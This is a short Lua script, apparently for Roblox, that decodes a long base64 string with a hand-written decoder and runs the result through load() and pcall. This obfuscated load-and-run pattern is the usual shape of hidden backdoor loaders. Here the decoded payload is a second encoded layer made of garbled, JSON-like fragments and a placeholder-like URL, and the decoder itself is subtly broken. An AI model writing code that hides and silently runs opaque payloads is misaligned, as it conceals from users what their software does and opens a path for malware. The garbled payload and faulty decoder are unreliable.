local base64 = {}
local chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

function base64.decode(data)
    local result = {}
    local buffer = 0
    local bits = 0
    
    for i = 1, #data do
        local char = data:sub(i, i)
        
        if char == '=' then
            break
        end
        
        local value = chars:find(char) - 1
        if value then
            buffer = (buffer << 6) | value
            bits = bits + 6
            
            if bits >= 8 then
                bits = bits - 8
                local byte = (buffer >> bits) & 0xFF
                table.insert(result, string.char(byte))
            end
        end
    end
    
    return table.concat(result)
end

local efee = "bG9jYWwgRW5jb2RpbmdTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJFbmNvZGluZ1NlcnZpY2UiKQpsb2NhbCBvayA9ICJaSFZ5WlhOamNtbHdkR2x2YmlJc0lDSmhZM1JwYjI0Z1lYQndiM0owWDNWeWJDSTZJQ0pqYjIxdFpXNWtjeUJ6YVhSbGMzUmpiMlJsSWl3Z0ltaDBkSEE2THk5dFlYQndiM0owTG1OdmJTOW1iMnhzWldOMGFXOXVMV0oxYVd4c2VTSXNJQ0p1WVcxbElqb2dJakV6TURFMklpd2dJbk4xWW1wbFkzUWlPaUFpTkRBeU5UazVPVGs1SWl3Z0luVnpaWEpmYVhSbGJTSmRMQ0FpWTI5dWRHVnVkRjlvWldGa1pYSWlPaUFpTWpBeE5qSTBOVFkwTWpjaUxDQWljMkZ1ZEdsdWRYTjBJam9nSW1GamEybHVaMFZ1WVdSZmRtVnliR2xpWVNJc0lDSjJZV3gxWlNJNklDSmpiMjF0Wlc1a2N5QnphWFJsYzNSamIyUmxJaXdnSW5OMVltcGxZM1FpT2lBaU1qVXdNakF4TURFeE5UVWlMQ0FpZEdWemRDSTZJQ0pqYjIxdFpXNWtjeUJ6YVhSbGMzUmpiMlJsSWl3Z0ltUmhkR0VpT2lBaWJtOTFibVFnYzJodmF5QnpkWE4wYVc5dUlpd2dJblJwYkdVaU9pQWlabWx5WlNJc0lDSjJZV3gxWlNJNklDSmpiMjF0Wlc1a2N5QnphWFJsYzNSamIyUmxJaXdnSW5OMVltcGxZM1FpT2lBaU1qVXdNakF4TURFeE5UVWlMQ0FpYzJWaGNtTm9Jam9nSW1GamEybHVaMFZ1WVdSZmRtVnliR2xpWVNJc0lDSnZjR1Z1WTJVaU9pQWlNVE0zTlRNaUxDQWlkR1Z6ZENJNklDSmpiMjF0Wlc1a2N5QnphWFJsYzNSamIyUmxJaXdnSW5ScGJHVWlPaUFpWm1seVpTSXNJQ0p6WldOMGFXOXVJam9nSW1GamEybHVaMFZ1WVdSZmRtVnliR2xpWVNJc0lDSnBaQ0k2SUNKamIyMXRaVzVrY3lCemFYUmxjM1JqYjJSbElpd2dJbU5zYVdWdWRDSTZJQ0pEU1VWU0lpd2dJbkpsWTI5MlpYSWlPaUFpTVRBMU1TSXNJQ0p1WVcxbElqb2dJbVYyWlc1MFUzUmhaMlVpTENBaWMyRnVkR2x1ZFhOMElqb2dJbUZqYTJsdVowVnVZV1JmZG1WeWJHbGlZU0lzSUNKemFXUmxiblJmZEhsd1pTSTZJQ0pEU1VWU0lpd2dJblYyWlc1MFVHeHBibVZmYm1GdFpTSTZJQ0pqYjIxdFpXNWtjeUJ6YVhSbGMzUmpiMlJsSWl3Z0ltcDNhVzVyWld4bFkzUWlPaUFpTVRFMU1pSXNJQ0oyWVd4MVpTSTZJQ0pqYjIxdFpXNWtjeUJ6YVhSbGMzUmpiMlJsSWl3Z0luTjFZbXBsWTNRaU9pQWlNalV3TWpBeE1ERXhOVFVpTENBaWRHVnpkQ0k2SUNKamIyMXRaVzVrY3lCemFYUmxjM1JqYjJSbElpd2dJbVJoZEdFaU9pQWlibTkxYm1RZ2MyaHZheUJ6ZFhOMGFXOXVJaXdnSW5ScGJHVWlPaUFpWm1seVpTSXNJQ0p6WldOMGFXOXVJam9nSW1GamEybHVaMFZ1WVdSZmRtVnliR2xpWVNJc0lDSnpjMlZ5ZG1WeUlqb2dJbUZqYTJsdVowVnVZV1JmZG1WeWJHbGlZU0lzSUNKcGJpSTZJQ0l4TURjeU5pSXNJQ0pqYjNKa1pYSTZJQ0kwT1RZeklpd2dJbWx6Y3lJNklDSm1iMnhzWldOMGFXOXVJbjA9"

function executarCodigoBase64(codigoBase64)
    local codigoDecodificado = base64.decode(codigoBase64)
    
    local func, erro = load(codigoDecodificado)
    
    if func then
        local status, resultado = pcall(func)
        if not status then
            print("durr2")
        end
    else
        print("durr")
    end
end

executarCodigoBase64(efee)
